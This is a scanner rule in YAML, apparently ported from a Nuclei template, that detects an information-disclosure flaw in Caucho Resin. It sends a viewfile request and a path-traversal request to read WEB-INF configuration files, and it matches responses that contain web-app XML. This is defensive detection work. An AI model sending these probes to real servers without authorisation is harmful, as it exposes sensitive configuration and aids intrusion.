schema_version: 1
id: "cortex.community:caucho-resin-info-disclosure"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Caucho Resin - Information Disclosure"
  description: "Caucho Resin contains an information disclosure vulnerability. The application does not properly sanitize user-supplied input. An attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.exploit-db.com/exploits/27888"
  cwes: [200]
  tags: ["exposure", "resin", "caucho", "edb", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "Info"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml" }
  - id: "probe1"
    request: { method: "GET", path: "/%20../web-inf/web.xml" }
proof:
  kind: "signal.v1"
  assertions:
    any:
      - all:
          - all:
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<web-app" } }
              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "</web-app>" } }
          - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
      - all:
          - all:
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "<web-app" } }
              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "</web-app>" } }
          - eq: { left: { ref: "steps.probe1.status" }, right: { value: 200 } }
